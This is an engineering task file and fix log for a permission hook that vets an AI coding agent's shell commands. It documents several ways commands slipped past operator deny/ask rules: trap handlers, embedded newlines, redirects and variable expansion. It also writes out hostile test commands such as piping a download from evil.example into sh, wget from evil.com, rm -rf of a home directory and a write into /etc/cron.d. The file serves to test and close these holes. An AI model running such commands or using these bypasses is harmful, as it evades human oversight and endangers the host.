# Task 28 — SAFE_BUILTINS bypasses deny/ask, and `trap` smuggles arbitrary code (bug)

**Status:** implemented (awaiting review + install) · **Type:** bug · **Created:** 2026-08-27 · **Rev:** 4
**Priority:** defect (b) is **critical**; defect (a) is high
**Suggested worker:** implement → review → fix loop, background agents
**Scope:** `.claude/hooks/pretool_hook.py`, `tests/test_integration_pretool.py`,
this file, and [`tasks/25_parser_shell_builtins.md`](./25_parser_shell_builtins.md)
§11 (done criterion 5 requires that file's log to be updated; the original scope
line omitted it and the two contradicted each other — corrected 2026-08-27 in the
review round, see §5).
No settings edits, no installer change, no store change.
**Read first:** §1 (both defects, with the measurements) · §2 (the fix) ·
§4 (constraints — the shared checkout and the installed-vs-repo rule)
**Origin:** found 2026-08-27 while closing out [task 25](./25_parser_shell_builtins.md),
whose fix (`6283e6b`) introduced both defects. Task 25 is reopened and points here.

## 1. The defects

Both live in the `SAFE_BUILTINS` shortcut added by `6283e6b` at
`.claude/hooks/pretool_hook.py:1216`, inside
`BashPermissionValidator._validate_single_command`.

### (a) The shortcut runs before deny and ask — high

```python
_effective_head = cmd.split()[0] if cmd.split() else ''
if _effective_head and '/' not in _effective_head and _effective_head in SAFE_BUILTINS:
    return {'allowed': True, 'denied': False, 'asked': False, ...}
```

This returns **before** any pattern lookup, so for all 19 head tokens in
`SAFE_BUILTINS` the operator's `permissions.deny` and `permissions.ask` lists are
never consulted.

**Measured 2026-08-27.** A scratch workspace whose merged settings genuinely
carried `deny: ['Bash(trap:*)', 'Bash(source:*)']` and `ask: ['Bash(unset:*)']`
— confirmed by calling `SettingsLoader.load_all_settings()` directly, not
assumed from the file on disk:

```
trap 'echo x' EXIT   -> Decision: allow   Reason: All sub-commands are allowed
source /tmp/foo.sh   -> Decision: allow   Reason: All sub-commands are allowed
unset FOO            -> Decision: allow   Reason: All sub-commands are allowed
```

All three should have been `deny`, `deny`, `ask`.

This contradicts **epic 22 invariant 1** — *"no path — hook, MCP, or reviewer —
downgrades a deny match to a prompt"* — and **brd D1/D2**, which landed one
commit earlier (`bb86c5b`). The two changes were never tested against each
other, and no test in the repo asserts that a denied or ask-listed builtin
actually denies or asks.

### (b) `trap` auto-allows an uninspected handler string — critical

`SAFE_BUILTINS`' own stated selection criterion is that the builtin *"must NOT
be able to execute an arbitrary command string or replace the current process
image"*. `trap` fails that criterion, and the comment beside it concedes so:
a literal handler "is NOT extracted or validated at trap-registration time — it
runs when the signal fires."

**Measured 2026-08-27:**

```
trap 'curl http://example.com/x | sh' EXIT                        -> allow
trap 'rm -rf /tmp/nope' EXIT; echo hi                             -> allow
trap 'curl http://evil.example/a | sh' EXIT; python3 tests/...    -> allow
```

The handler runs in the same shell when it exits, having never been validated by
anything. This is the same bypass class the set deliberately excludes `eval` to
prevent — *"the canonical 'exec anything' builtin. Adding it would make
SAFE_BUILTINS a bypass for the entire permission system."* `trap` is that
builtin with a delay.

Combined with (a) it cannot even be retracted by an operator: adding
`Bash(trap:*)` to `permissions.deny` has no effect.

**This is live.** `~/.claude/hooks/pretool_hook.py` is byte-identical to the
repo copy as of 2026-08-27 11:36.

### (c) `source` with a non-literal argument — lower, fix in the same pass

`source` is defended in the comment as safe because it names "a file already on
disk; no code-generation surface". That holds for `source ./lib.sh`. It does not
hold for `source "$X"` or `source $(mktemp_and_write)`, where the target is
chosen at runtime. Task 25's own "proposed shape of fix" flagged this
(*"maybe `source` when the argument is a variable"*) and it was not implemented.

## 2. The fix

### 2.1 Move the shortcut below deny and ask

`SAFE_BUILTINS` must be an **allow-tier shortcut only** — it may skip the
*allow* pattern lookup; it may never skip deny or ask. Concretely: the deny and
ask matching for the effective command must happen first, and only when neither
matches may the head-token shortcut return `allowed: True`.

Preserve the existing behaviour exactly when no deny/ask pattern matches — that
is the common case and the reason task 25 existed. `NOOP_BUILTINS` /
`control_prefix` is a separate earlier return; **leave it alone**, it is a
"runs nothing at all" path, not an authorization decision.

### 2.2 `trap`: validate the handler, don't trust it

Keep `trap` usable — the original report
(`trap 'rm -f temp/review.lock' EXIT; python3 tests/run_all_tests.py`) is a real
workflow — but stop treating the handler as inert:

- extract the handler argument (the string that becomes the trap action) and
  validate it as its own sub-command, through the same validator, exactly as
  `$(…)` substitutions are already extracted;
- the `trap` invocation itself stays allowed; the **verdict for the whole
  sub-command is the handler's verdict**, so `trap 'curl … | sh' EXIT` inherits
  whatever `curl … | sh` decides;
- if the handler cannot be parsed with confidence, return **ask**, never allow.
  H2 from task 27 applies in spirit: an over-tight matcher is annoying, an
  over-loose one is the bug being fixed.

Note the expected consequence, and that it is correct: the original report's
command will now likely **ask** — because of `rm -f`, which is the actual risk —
rather than because `trap` was an unknown token. Surfacing the real reason is
the point. If that proves noisy, the answer is a narrow allowlist entry for the
`rm`, not re-blinding the parser.

### 2.3 `source`: shortcut only a literal path

Do not take the `SAFE_BUILTINS` shortcut for `source`/`.` when the argument
contains a shell expansion — `$`, a backtick, or a `$(` — and fall through to
the normal pattern path (which today means `ask` unless a pattern matches).

## 3. Tests — all three defects, each watched to fail first

Add to `tests/test_integration_pretool.py`. Every test below **must be observed
failing against the current code before the fix**, and the report must say so.
That is not ceremony: task 25 shipped green with none of this asserted, and
epics 23 and 22 both record cases where a green suite hid the requirement.

1. A builtin in `permissions.deny` **denies** — no prompt, reason names the
   pattern. Cover at least `trap` and `source`.
2. A builtin in `permissions.ask` **asks**, even though it is in
   `SAFE_BUILTINS`. Cover `unset`.
3. Deny beats ask beats allow for a builtin listed in more than one tier
   (epic 22 D2 ordering, now applied to this path).
4. The task-25 regression stays fixed: with no deny/ask patterns present, the
   plain builtins (`shift`, `local`, `wait`, `umask`, `ulimit`, `getopts`,
   `return`, `continue`, `unset`, `readonly`) still auto-allow.
5. `trap 'curl http://example.com/x | sh' EXIT` no longer decides `allow`.
6. `trap 'echo hi' EXIT` — a handler that is itself allowlisted — still allows,
   so 2.2 is a real validation and not a blanket block.
7. `source "$X"` and `source $(mktemp)` do not take the shortcut;
   `source ./lib.sh` still does.
8. `eval` and `exec` remain excluded (existing tests must stay green).

Use the same construction the existing `SAFE_BUILTINS` tests use — a settings
fixture the validator actually loads. Assert through the validator, not through
a mock of it. Do not use `skipTest` anywhere; a broken fixture must fail.

## 4. Constraints

- **Shared checkout.** Other sessions are working in this tree. No repo-wide git
  operations (`stash`, `checkout`, `reset` without a pathspec). Copy a file
  aside rather than reverting it. Do not commit anything outside the files in
  §Scope.
- **A repo edit is not live.** `.claude/hooks/*` reaches `~/.claude/hooks/` only
  through `./install-claude-config.sh`. Do **not** run the installer; say in the
  report that it still needs to run, and which copy was tested.
- Run the full suite (`python3 tests/run_all_tests.py`) and report before/after
  counts. Baseline at filing: **1308 ran, OK, 1 skipped**
  (`test_headless_spawn`, pre-existing).
- No changes to `settings.json`, the installer, or the state store.

## 5. Done criteria

1. §2.1, §2.2, §2.3 implemented.
2. All eight test groups in §3 present and green, with the report naming which
   ones were watched to fail first and what they printed when they did.
3. Full suite green, counts reported.
4. This file updated with an implementation log: what landed, what was decided
   differently and why, and the residual risk.
5. [Task 25](./25_parser_shell_builtins.md) §11 updated to point at the outcome
   and its step-4 pruning question resolved (with 2.1 fixed, the
   `Bash(set:*)`…`Bash(read:*)` entries are genuinely redundant — note that the
   installer **unions** repo settings into `~/.claude/settings.json` and never
   subtracts, so pruning needs a manual edit of the global file too).

## 5. Implementation log

- **2026-08-27 — §2.1, §2.2, §2.3 implemented in the repo copy.**
  Files touched: `.claude/hooks/pretool_hook.py`,
  `tests/test_integration_pretool.py`, this file. Nothing else — no settings,
  no installer, no store. **Not installed:** `~/.claude/hooks/pretool_hook.py`
  is still the pre-fix byte-identical copy; `./install-claude-config.sh` has
  **not** been run, so the live gate is unchanged until it is. Everything below
  was measured against the **repo** copy.

### What landed

- **§2.1 — the shortcut is allow-tier only.**
  `_check_single_command` now calls `_tier_override_result(cmd)`
  (`pretool_hook.py:1414`) *before* the `SAFE_BUILTINS` return
  (`:1277`). Deny outranks ask outranks the shortcut; only when neither matches
  does the head-token path return `allowed: True`. The candidate-string builder
  (basename variant + `.`→`source` alias) was extracted into
  `_pattern_candidates` (`:1375`) and `_match_deny_and_ask` (`:1404`) so the
  override and the normal pattern lookup cannot drift apart — two candidate
  builders that disagreed would be a new bypass.

- **§2.2 — `trap` handlers are validated, not trusted.**
  `_trap_handler` (`:1481`) extracts the handler argument with `shlex`
  (`cmd.split()` shreds a quoted handler), skipping `-l`/`-p`/`--`;
  `_trap_handler_verdict` (`:1543`) parses that handler with the same
  `parse_with_offsets` used for `$(…)` extraction and runs every resulting
  sub-command back through `_check_single_command`. The verdict for the whole
  `trap …` sub-command is the handler's verdict; the `trap` invocation itself
  stays allowed when the handler is. Unparsable handlers, unrecognised options
  and >3 levels of trap-inside-trap return **ask**, never allow
  (`_trap_ask_result`, `:1624`).

- **§2.3 — `source` shortcuts only a literal path.**
  `_source_operand_is_literal` (`:1450`) refuses the shortcut when the operand
  carries `$` or a backtick, and also when there is **no operand left** — the
  parser strips a `$(…)`/backtick token out of the normalized sub-command, so
  `source $(mktemp)` arrives as a bare `source`. Those fall through to the
  normal pattern path.

### Decided differently from the brief, and why

1. **The `control_prefix` / NOOP return also consults deny+ask — but only for
   head tokens that are in `SAFE_BUILTINS`** (`:1247`). §2.1 says to leave that
   return alone, but §3's required test ("a builtin in `permissions.ask` asks —
   cover `unset`") cannot pass if it is: `unset` is in **both** `NOOP_BUILTINS`
   and `SAFE_BUILTINS`, so it reaches an auto-allow through the *earlier* door
   and never touches the shortcut. Measured pre-fix: `unset FOO` returned
   `matched_allow_patterns: ['control_prefix']`, not `['safe_builtin']`. Ten of
   the nineteen tokens are in this position. Leaving the NOOP return untouched
   would have fixed the defect only for `trap` and `source` while §1's own
   third measurement (`unset FOO -> allow` under `ask: ['Bash(unset:*)']`)
   stayed broken. The gate is deliberately narrow — head token in
   `SAFE_BUILTINS` — so the genuine "runs nothing" returns (function-def
   headers, `command -v`, `((…))`, `:`/`exit`, `cd`, `declare`, `shopt`, …)
   keep their exact previous behaviour and cannot acquire a new false deny.

2. **`trap SIG` (bash's lone-sigspec reset) now asks instead of allowing.**
   Not in the brief. Reason: the parser normalizes an *unquoted* substitution
   handler down to exactly that shape — `trap $(gen) EXIT` and
   `` trap `gen` EXIT `` both arrive as `trap EXIT`, the substitution having
   been extracted as its own sub-command and the token dropped. Exempting the
   shape would have reopened defect (b) through a second door, needing only an
   allowlisted generator (`echo`, `cat`, `printf`) to hand `trap` an
   uninspected handler. The idiomatic reset `trap - EXIT` stays allowed, as do
   `trap`, `trap -p …`, `trap -l`, `trap '' SIG`.

3. **A handler containing `$` or a backtick asks** (`:1574`), the same rule
   §2.3 gives `source`. Without it, `trap "$(cat payload.sh)" EXIT` parses into
   the allowlisted `cat payload.sh` and allows — but what gets *registered* is
   that file's contents. Validating the generator is not validating the
   handler.

4. **Task 25 §11 was not updated** (done-criterion 5). The implementing agent
   was scoped to `pretool_hook.py`, `test_integration_pretool.py` and this
   file only; §11's pointer and its step-4 pruning question are still open.

### Tests

31 tests in `TestSafeBuiltinsTierOrdering`
(`tests/test_integration_pretool.py:1709`), plus one existing test corrected
and one added at `:1138`/`:1154`. **22 of the 31 were watched failing against
the pre-fix code** (a pristine `HEAD` copy of the hook in an isolated scratch
tree — the shared checkout was never reverted); every one of them printed the
same thing, `allow` where the tier or the handler should have decided:

```
test_denied_trap_denies                       AssertionError: 'allow' != 'deny'
test_denied_source_denies                     AssertionError: 'allow' != 'deny'
test_denied_builtin_denies_even_when_also_allowlisted   'allow' != 'deny'
test_denied_builtin_in_compound_denies_whole_command    'allow' != 'deny'
test_ask_listed_unset_asks                    AssertionError: 'allow' != 'ask'
test_ask_listed_trap_asks                     AssertionError: 'allow' != 'ask'
test_ask_outranks_allow_for_builtin           AssertionError: 'allow' != 'ask'
test_deny_beats_ask_beats_allow_for_builtin   AssertionError: 'allow' != 'deny'
test_deny_beats_ask_for_noop_path_builtin     AssertionError: 'allow' != 'deny'
test_trap_handler_with_pipe_to_sh_does_not_allow        'allow' == 'allow'
test_trap_handler_inherits_deny_verdict       AssertionError: 'allow' != 'deny'
test_trap_handler_does_not_leak_through_a_compound      'allow' == 'allow'
test_trap_handler_double_quoted_is_validated  AssertionError: 'allow' != 'ask'
test_trap_unparsable_handler_asks             AssertionError: 'allow' == 'allow'
test_trap_handler_deny_survives_nesting       AssertionError: 'allow' == 'allow'
test_trap_handler_built_by_substitution_asks  (6 subTests) 'allow' == 'allow'
test_trap_bare_sigspec_reset_asks_not_allows  AssertionError: 'allow' != 'ask'
test_source_quoted_variable_does_not_take_the_shortcut  'allow' != 'ask'
test_source_bare_variable_does_not_take_the_shortcut    'allow' != 'ask'
test_source_command_substitution_does_not_take_the_shortcut 'allow' != 'ask'
test_source_backtick_substitution_does_not_take_the_shortcut 'allow' != 'ask'
test_source_expansion_still_denies_when_denied          'allow' != 'deny'
```

The other 9 are **regression guards** and pass before *and* after by design —
they are what catches an over-tightened fix, not the bug: §3.4 (the ten plain
builtins still auto-allow with an empty allow list), §3.6 (`trap 'echo hi'
EXIT` still allows), §3.7's positive half (`source ./lib.sh` still returns
`['safe_builtin']`), §3.8 (`eval`/`exec` still ask and are still out of the
set), the task-25 reported command, `trap` reset/query forms, the
`cleanup(){…}; trap cleanup EXIT` shape, and the `.`-spelling deny.

One existing test **encoded the bug** and was corrected:
`test_end_to_end_trap_allowed_via_safe_builtins_not_tr_pattern` asserted that
`trap "wget http://evil.com/x" EXIT` decides `allow`. Its real purpose (proving
the allow comes from `SAFE_BUILTINS`, not a `Bash(tr:*)` prefix bleed) is kept
with an allowlisted handler plus an explicit `matched_allow_patterns ==
['safe_builtin']` assertion; the `wget` case is now asserted as the `ask` it
should always have been (`:1154`).

**Suite:** 1308 ran / OK / 1 skipped before → **1340 ran / OK / 1 skipped**
after (`python3 tests/run_all_tests.py`). The one skip is the pre-existing
`test_headless_spawn`. No `skipTest` and no bare `except` were added.

### Verified by hand (dry-run harness)

Scratch workspace whose merged settings were confirmed through
`SettingsLoader.load_all_settings()` to carry
`deny: ['Bash(trap:*)', 'Bash(source:*)']`, `ask: ['Bash(unset:*)']` — the §1
measurement set, now decided correctly:

```
trap 'echo x' EXIT   -> deny  Matches a denied pattern: `trap 'echo x' EXIT`
source /tmp/foo.sh   -> deny  Matches a denied pattern: `source /tmp/foo.sh`
unset FOO            -> ask   Matches an ask pattern: `unset FOO`
```

A second scratch workspace with `deny: ['Bash(curl:*)']`:

```
trap 'curl http://example.com/x | sh' EXIT -> deny  Matches a denied pattern: `trap …`
```

### Residual risk

1. **Not installed.** The live hook is still the pre-fix copy.
   `./install-claude-config.sh` must run before any of this is in force.
2. **Under *this repo's own* allowlist, the §1 trap examples still decide
   `allow`** — because `Bash(curl:*)`, `Bash(sh:*)` and `Bash(rm:*)`-via-
   workspace-rm are genuinely allowlisted here, so the handler now *evaluates*
   to allowed rather than being skipped. Defect (b) is closed (the handler is
   read, and a `deny` for it now bites, as measured above), but the operator's
   own policy is what decides. Anyone reading "allow" as "unfixed" should check
   the allowlist first.
3. **§2.3 is currently masked in practice by `Bash(source:*)`**, which the
   installer has already unioned into `~/.claude/settings.json`. `source "$X"`
   therefore still allows on the pattern path. Task 25 §11 step 4's pruning is
   what makes §2.3 bite — and the installer never subtracts, so pruning needs a
   manual edit of the global file as well as the repo one.
4. **The other auto-allow shortcuts still sit above deny/ask**:
   `local_function`, `workspace_binary` and `workspace_rm` return
   `allowed: True` without consulting the operator's lists, exactly as
   `safe_builtin` used to. A `deny: ['Bash(rm:*)']` still does not stop
   `rm ./file` inside the workspace. Out of scope for task 28 — but it is the
   same defect class and should be filed.
5. **Genuine "runs nothing" reductions are still un-gated** for tokens outside
   `SAFE_BUILTINS` (`cd`, `declare`, `shopt`, `let`, `hash`, `pushd`, …, and
   every scaffolding keyword). A `deny: ['Bash(cd:*)']` is still ignored. This
   was a deliberate narrowing (decision 1 above) to avoid new false denies on
   function-definition headers; widening it needs its own measurement pass.
6. **`env`-wrapped builtins are not tier-checked on the NOOP path**:
   `env unset X` normalizes to `env unset X`, whose head is `env`. The deny
   pattern `Bash(unset:*)` would not match that string anyway (patterns are
   prefix-anchored on the command word), so nothing is lost relative to the
   pattern engine — but it is a known edge of `_effective_head_token`.
7. **Tightened trap surface may be noisy.** `trap 'rm -f /var/tmp/x' EXIT`,
   `trap EXIT`, `trap "cleanup $(date)" EXIT` and any handler naming a
   non-allowlisted binary now prompt where they previously auto-allowed. Per
   §2.2 that is the intended trade; the fix for noise is a narrow allowlist
   entry for the handler's command, not re-blinding the parser.
8. **`trap` handler extraction assumes bash's grammar.** `shlex` is POSIX-ish,
   not bash: an exotic quoting form (`$'…'`, a handler split across a heredoc)
   resolves to a token that will not match anything and therefore asks. That is
   the safe direction, but it is a divergence from what bash would actually
   register.

### Review round 2 — 2026-08-27 (fixer pass)

The implementation above was reviewed and **failed**. This round fixes the
findings. Files touched: `.claude/hooks/pretool_hook.py`,
`tests/test_integration_pretool.py`, this file, and `tasks/25` §11 (§Scope
corrected above to authorise the last one). **Still not installed** —
`./install-claude-config.sh` has not been run; everything below was measured
against the **repo** copy.

#### BLOCKER 1 — a newline inside the handler bypassed handler validation

`BashCommandParser._strip_grouping_tokens` re-joins a normalized sub-command on
single spaces (`' '.join(command.split())`), which collapses a newline held
*inside* a quoted token. A two-line handler therefore reached `_trap_handler` as
one line, and only line 1 was ever validated:

```
trap 'echo start\nrm -rf /home/anton/important' EXIT
  -> "trap 'echo start rm -rf /home/anton/important' EXIT"   (parser)
  -> handler "echo start rm -rf /home/anton/important"       (one `echo` command)
  -> allow
```

**Chosen direction: recover the handler's raw text** (the reviewer's option 1,
"most correct"), *not* the blanket newline→ask (option 3), and not the parser
change (option 2 — `bash_command_parser.py` is outside this task's scope, and
preserving newlines inside quoted tokens changes the normalized string every
other consumer matches patterns against).

`_recover_raw_handler(handler, raw_command)` (`pretool_hook.py`) looks the
handler up **by content, not by offset**: every raw token of the pre-normalization
command (recursing into `$(…)`, via `_raw_token_values`) whose own
whitespace-collapse yields this handler is a candidate. Exactly one candidate →
use its raw text; several distinct ones → `confident=False` → ask; none, or a
`raw_command` that never had collapsible whitespace → return the handler
unchanged, which is correct precisely when no newline was lost. Content matching
is what makes a `trap` nested inside a substitution work: there, every extracted
sub-command shares the enclosing substitution's offset, so an offset lookup
cannot identify it.

The raw text is threaded as a new `raw_command=` keyword on
`_check_single_command` (set from `validate_bash_command`'s own `command`) and on
`_trap_handler_verdict`. The nested-trap recursion passes the *recovered handler*
as the raw source for the sub-commands parsed out of it, so line 2 of a handler
that itself registers a trap is recovered the same way.

Notes on the mechanism: `_expand_constants` cannot smuggle a newline into a
handler (`is_constant_value` rejects any value containing whitespace), and
`$'…'` handlers were already refused by the expansion guard.

#### HIGH 1 — the handler now goes through the write-redirect gate

`_trap_handler_verdict` runs `extract_write_redirect_targets(handler)` through
`_is_redirect_target_allowed` and asks on any target outside the workspace,
`/tmp`, or the write-safe `/dev` sinks — the same gate `validate_bash_command`
applies to the whole command, which the handler previously escaped entirely.
Deny still outranks it (the redirect result only joins the ask branch).
Constant `$VAR` targets are not expanded on this side (no assignment map here),
so an unresolvable target falls to the same literal-prefix rule and asks when it
has no allowed anchor.

#### MEDIUM 1 — the NOOP-path tier gate reads the reduced sub-command

Took the reviewer's preferred fix. `_reduce_to_effective_command` grew a
`noop_reveal=True` mode: where a `NOOP_BUILTINS` head or a
`SCAFFOLDING_KEYWORDS` head would collapse the sub-command to `''`, it returns
the prefix-peeled remainder instead (`if unset SECRET` → `unset SECRET`). The
gate in `_check_single_command` now feeds `_tier_override_result` that string, so
it matches the same text the normal pattern path at the bottom of the method
would. It is used *only* for the tier lookup — what executes is still decided by
the default reduction.

`_effective_head_token` is gone, replaced by `_head_token` (a plain first-word
split) shared by both auto-allow paths. Its `KEY=VALUE` peel was dead — the
parser strips env prefixes before `_check_single_command`, and after the change
the reducer strips them again — while none of the thirteen prefixes that *do*
reach the gate were handled. Residual-risk item 6 of the previous round (`env
unset X` not tier-checked) is **closed** by this: `env`, `command`, `builtin`,
`time`, `nohup`, `timeout 5`, `if`, `while`, `until`, `then`, `else`, `elif` and
`!` all now deny under `deny: ['Bash(unset:*)']`.

#### MEDIUM 2 — done criterion 5

§Scope corrected (above) so it no longer forbids the file criterion 5 requires.
`tasks/25` §11 now carries the outcome bullet, and step 4's pruning question is
answered there: the `Bash(set:*)`…`Bash(read:*)` entries are genuinely redundant
now that the shortcut sits below deny/ask, but pruning is **not** a repo-only
edit — `install-claude-config.sh` unions repo settings into
`~/.claude/settings.json` and never subtracts, so the already-installed copies
must be removed from the global file by hand. Filed there as its own change,
out of this task's scope.

#### LOW findings

- `_source_operand_is_literal`'s docstring no longer claims a "literal path":
  it now says what the check actually is (no `$`/backtick expansion), and states
  explicitly that a glob or `~` passes — the same property `source ./x.sh` has,
  which §2.3 already allows. Behaviour unchanged, deliberately: tightening it to
  reject globs would be a new refusal class with no measured need.
- The dead `.` arm of `if _effective_head in ('source', '.')` is removed —
  `.` is not in `SAFE_BUILTINS`, so `. ./lib.sh` never reaches the shortcut. The
  asymmetry it documented is left as-is and now commented: deny is symmetric
  across both spellings (via `_alias_variant`), allow is not, and `. ./lib.sh`
  asks. Widening allow is not a fix this review asked for.
- **Not fixed, recorded:** `/usr/bin/trap 'curl …' EXIT` under
  `allow: ['Bash(trap:*)']` allows via the basename variant without the handler
  being read. `/usr/bin/trap` is not a real executable on any normal system (bash
  has no external `trap`), so this is an inconsistency, not a reachable bypass.
- **Not fixed, recorded:** `export FOO=bar` normalizes to a bare `export`, so an
  ask prompt names a command with no arguments. Cosmetic; it lives in the
  parser's ENV-token handling, outside this task's scope.

#### Tests

All added to `TestSafeBuiltinsTierOrdering` (whose `_validator` asserts the
fixture's allow/deny/ask lists actually reached the validator). Nine new tests,
**each watched to fail against the pre-fix code first**:

| test | pre-fix output |
| --- | --- |
| `test_trap_handler_second_line_after_newline_is_validated` | `AssertionError: 'allow' != 'deny'` |
| `test_trap_handler_newline_payload_is_not_auto_allowed` | `AssertionError: 'allow' != 'ask'` |
| `test_trap_handler_newline_variants_do_not_allow` (5 of 6 subtests: blank line, indented, CRLF, multi-sigspec, nested trap) | `AssertionError: 'allow' == 'allow'` |
| `test_trap_handler_redirect_target_is_gated` | `AssertionError: 'allow' != 'ask'` |
| `test_noop_path_tier_gate_survives_every_peelable_prefix` (13 of 14 subtests) | `AssertionError: 'allow' != 'deny'` |
| `test_while_read_respects_a_read_deny` | `AssertionError: 'allow' != 'deny'` |

The `$'echo a\ncurl …'` subtest and three guard tests
(`test_trap_multiline_handler_still_allows_when_every_line_is_allowed`,
`test_trap_handler_redirect_inside_the_workspace_still_allows`,
`test_prefixed_noop_builtin_still_allows_without_a_deny`) passed before and
after — they exist to catch the fix over-tightening.

**Suite:** 1340 ran / OK / 1 skipped before → **1349 ran / OK / 1 skipped**
after (`python3 tests/run_all_tests.py`). The skip is the pre-existing
`test_headless_spawn`. No `skipTest`, no bare `except`.

#### Measured end to end

Pre-fix column is a scratch copy of the repo hooks directory with the two trap
fixes neutralised (`cp -a` into `/tmp`; the repo tree was never reverted).
Scratch workspace whose `deny: ['Bash(curl:*)']` was confirmed through
`SettingsLoader.load_all_settings()` before the runs:

```
                                          pre-fix   post-fix
trap 'echo a\ncurl http://e/x' EXIT        allow  ->  deny
trap 'echo a; curl http://e/x' EXIT        deny   ->  deny     (control)
trap 'echo ok > /etc/cron.d/pwn' EXIT      allow  ->  ask
trap 'echo ok > <workspace>/out.log' EXIT  allow  ->  allow    (control)
```

Against **this repo's own** merged settings:

```
trap 'echo start\nrm -rf /home/anton/important' EXIT   allow -> ask
trap 'echo ok > /etc/cron.d/pwn' EXIT                  allow -> ask
trap 'rm -f temp/review.lock' EXIT; python3 …          allow -> allow  (task 25's command)
while read -r line / source ./lib.sh / trap - EXIT     allow -> allow
```

#### Residual risk (round 2)

1. **Still not installed.** `~/.claude/hooks/pretool_hook.py` is the pre-fix
   copy; `./install-claude-config.sh` must run before any of this is live.
2. **Handler recovery depends on the raw text being threaded.** A future caller
   of `_check_single_command` that omits `raw_command=` re-opens BLOCKER 1 for
   the traps it validates (the function falls back to the collapsed handler).
   `validate_bash_command` is the only production entry point and it passes it;
   the nested-trap recursion passes the recovered handler.
3. **Ambiguity asks.** Two distinct raw tokens that collapse to the same handler
   text make the recovery refuse to choose and the trap asks. Contrived, and the
   safe direction.
4. **All three workspace shortcuts still outrank deny inside a handler.**
   *(Corrected in round 3 — this item originally named only `workspace_rm`,
   which was wrong.)* `workspace_rm`, `workspace_binary` and `local_function`
   all sit above the tier check, so all three leak identically, and they leak on
   the **direct** path too — the trap path merely inherits the verdict. Measured
   (`allow: ['Bash(echo:*)']`, workspace `/tmp`):

   ```
                       deny pattern              direct   inside trap
   workspace_rm        Bash(rm:*)                allow    allow
   workspace_binary    Bash(./deploy.sh:*)       allow    allow
   local_function      Bash(cleanup:*)           allow    allow
   ```

   The newline fix does not change this either way (`trap 'echo a\nrm
   ./file.txt' EXIT` decides exactly what the `;` spelling does). Same defect
   class as round 1's residual item 4; deliberately left alone here — it is
   task 30.
5. Round 1's residual items **1, 2, 3, 5, 7, 8 still stand**; item 6 is closed
   (see MEDIUM 1 above); item 4 is restated as item 4 here.


### Review round 3 — 2026-08-27 (fixer pass)

Round 2's review **failed**: the newline bypass round 2 closed was alive again
through the constant-expansion path, and the recovery heuristic could also
produce a false deny. Both findings were the same failure — recovery substituted
a string it could not prove was this handler's source and then trusted the
verdict. Fixed together, under one rule.

#### The governing rule now in the code

**Recovery that is not provably correct asks — never allows, never denies on a
guess.** `_recover_raw_handler` has exactly one confident pass-through left: the
raw command contains no collapsible whitespace, so no newline can have been
lost. Everything else must produce exactly one provable candidate or the trap
prompts.

#### BLOCKER — `_expand_constants` defeated content-based recovery

`validate_bash_command` (`:601-605`) expands constant `$VAR` references into the
normalized sub-command and hands the **expanded** text to `_check_single_command`
while threading the **un-expanded** raw command through for recovery.
`_recover_raw_handler` matched by content, so once expansion had rewritten the
handler no raw token collapsed to it, `candidates` came back empty, and the
"none matched" branch at `:1654-1655` returned the **flattened** handler with
`confident=True`. Only line 1 was ever validated. The `$` guard in
`_trap_handler_verdict` missed for the same reason: expansion had already
removed the `$`.

Fixed by the reviewer's **direction 1** (thread the pre-expansion text into
recovery and expand after recovering), realised inside `_recover_raw_handler`
rather than by a second parse:

- `const_assignments` is threaded `validate_bash_command` → `_check_single_command`
  → `_trap_handler_verdict` → `_recover_raw_handler` (and through the nested-trap
  recursion).
- A raw token is a candidate when its own collapse equals the handler **or**
  expands to it under the same assignment map and offset. What is recovered is
  that token's raw text **with the same expansion applied**, so the handler that
  gets validated is the one bash will actually run.

Net effect: the newline spelling now decides exactly what the `;` spelling
decides. That equivalence is the invariant the new tests pin.

#### MEDIUM — recovery could select the WRONG raw token (false deny)

Candidacy required only that *some* raw token collapse to the handler, and the
real handler token was **skipped** when it had lost no whitespace
(`:1643-1644`, `if collapsed == value: continue`). A newline-bearing decoy
elsewhere in the command could therefore be the sole candidate and supply the
verdict for a handler it had nothing to do with. The ambiguity guard fired only
on *distinct* candidates, so one wrong candidate sailed through. A false deny
hard-blocks with no human rescue (epic 22 H1).

Fixed by dropping the skip: the real token now stands as its own candidate, so
the decoy shape has two distinct candidates and asks. Considered and rejected:
"validate every candidate and take the strictest verdict" — that keeps the false
deny, since the decoy *is* the strictest.

#### The third change: no candidate now asks

Once a collapse has happened somewhere in the raw command, the handler's own
token must turn up in the scan. If it does not — an unbalanced fragment, a
re-tokenization failure, a normalization this method does not model — there is
no proof left to lean on, so `confident=False`. This is the reviewer's
blunt-but-provable fallback and it is what makes every miss degrade to a prompt
instead of a silent allow.

#### Files

- `.claude/hooks/pretool_hook.py` — `_recover_raw_handler` rewritten (signature
  gains `const_assignments`, `cmd_offset`); `const_assignments` threaded through
  `_check_single_command` and `_trap_handler_verdict`; docstrings carry the
  reasoning and the pre-fix verdicts.
- `tests/test_integration_pretool.py` — 10 tests added to
  `TestSafeBuiltinsTierOrdering`.

**The guard test `test_trap_multiline_handler_still_allows_when_every_line_is_allowed`
did NOT have to change** — it passes unmodified before and after. The fix
recovers the handler rather than refusing to, so an all-allowed two-line handler
keeps its allow.

#### Tests — watched to fail first

Written against the fix, then run against a `/tmp` mirror of the repo carrying
the round-2 (pre-fix) `pretool_hook.py` (`cp -a`; the repo tree was never
reverted). Verbatim failures on the pre-fix hook:

```
FAIL: test_trap_newline_handler_constant_expansion_does_not_allow
      (role='the whole operand',   cmd="X=http://e/x; trap 'echo a\ncurl $X' EXIT")
      AssertionError: 'allow' != 'deny'
FAIL: test_trap_newline_handler_constant_expansion_does_not_allow
      (role='part of the operand', cmd="U=e/x; trap 'echo a\ncurl http://$U' EXIT")
      AssertionError: 'allow' != 'deny'
FAIL: test_trap_newline_handler_constant_expansion_does_not_allow
      (role='the command word',    cmd="C=curl; trap 'echo a\n$C http://e/x' EXIT")
      AssertionError: 'allow' != 'deny'
FAIL: test_trap_newline_handler_constant_expansion_does_not_allow
      (role='a braced reference',  cmd="P=/x; trap 'echo a\ncurl http://e${P}' EXIT")
      AssertionError: 'allow' != 'deny'
FAIL: test_trap_constant_expansion_newline_payload_asks_without_a_deny
      AssertionError: 'allow' != 'ask'
FAIL: test_trap_handler_decoy_raw_token_asks_instead_of_denying
      AssertionError: 'deny' != 'ask'
FAIL: test_recover_raw_handler_asks_when_nothing_matches
      AssertionError: True is not false
Ran 50 tests in 0.017s
FAILED (failures=7)
```

Four test methods fail pre-fix (the first carries four failing subTests; its
fifth, the round-1 baseline with no constant, passes on both — round 2's fix
